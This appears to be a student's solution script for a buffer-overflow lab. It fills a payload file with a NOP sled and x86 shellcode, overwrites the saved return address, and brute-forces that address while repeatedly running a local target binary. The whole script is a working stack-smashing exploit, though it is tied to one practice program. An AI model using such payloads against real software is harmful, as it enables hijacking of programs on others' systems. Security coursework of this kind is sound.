#!/usr/bin/python3
import sys
def get_content(num):
  shellcode= (
   "\x31\xc9\x31\xc0\x31\xd2\x66\xb8\x00\x03\xb1\x44\xb2\x01\x51\x50"
   "\x52\xbb\x8f\x63\x55\x56\xff\xd3"
  ).encode('latin-1')
  # Fill the content with NOP's
  content = bytearray(0x90 for i in range(408)) 

  ##################################################################
  # Put the shellcode somewhere in the payload
  start = 0               # Change this number 
  content[start:start + len(shellcode)] = shellcode
  #print(len(shellcode))


  # Decide the return address value 
  # and put it somewhere in the payload
  ret    = 0xffffd5d8 + num    # Change this number 
  offset = 408 + 4             # Change this number

  #print('ret is = ' , hex(ret))
  L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
  # BUF_SIZE = 528
  
  content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
  #content[offset+2*L:offset + 3*L]=(0x300).to_bytes(L,byteorder='little')
  #content[offset+3*L:offset + 4*L]=(0x44).to_bytes(L,byteorder='little')
  return content 
##################################################################

# Write the content to a file

for  i in range(-500, 1000, 1): 
    with open('badfile', 'wb') as f:
      print('i = ', i)
      f.write(get_content(i))
    import os, time

    s = time.time()

    import subprocess
    subprocess.call(['./A1'])
    if time.time() - s > 1.0:
      break
